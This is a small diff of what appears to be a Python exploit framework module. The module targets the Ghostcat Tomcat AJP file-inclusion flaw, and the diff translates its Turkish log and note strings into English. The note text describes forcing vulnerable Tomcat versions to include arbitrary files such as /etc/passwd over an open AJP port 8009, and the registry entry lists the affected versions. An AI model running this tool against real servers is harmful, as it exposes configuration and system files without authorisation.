@@ -111,7 +111,7 @@ def ghostcat(params) -> dict:
     markers = [marker] if marker else _RCE_MARKERS
     success = bool(marker and marker in txt) or any(m in txt for m in _RCE_MARKERS)
     if len(data) == 0:
-        log.append("AJP yaniti bos — AJP kapali mi, secretRequired mi, veya surum patched (>=9.0.31/8.5.51/7.0.100)?")
+        log.append("empty AJP response — is AJP off, is secretRequired set, or is the version patched (>=9.0.31/8.5.51/7.0.100)?")
         success = False
     log.append(f"resp_bytes={len(data)} status={res['status']} success={success}")
     return {
@@ -148,7 +148,7 @@ EXPLOITS = {
         "affected": ["7.0.x<7.0.100", "8.5.x<8.5.51", "9.0.x<9.0.31"],
         "note": ("Native AJP/1.3 (raw socket): javax.servlet.include.* attribute'lari ile Tomcat'i "
                  "keyfi dosyayi include etmeye zorlar. Kanit = dosyanin gercek byte'lari "
-                 "(WEB-INF/web.xml, MANIFEST, /etc/passwd). AJP 8009 acik + secretRequired=false "
+                 "(WEB-INF/web.xml, MANIFEST, /etc/passwd). AJP 8009 open + secretRequired=false "
                  "(pre-9.0.31/8.5.51/7.0.100) hedefte calisir."),
         "inputs": list(_INPUTS),
         "run": ghostcat,
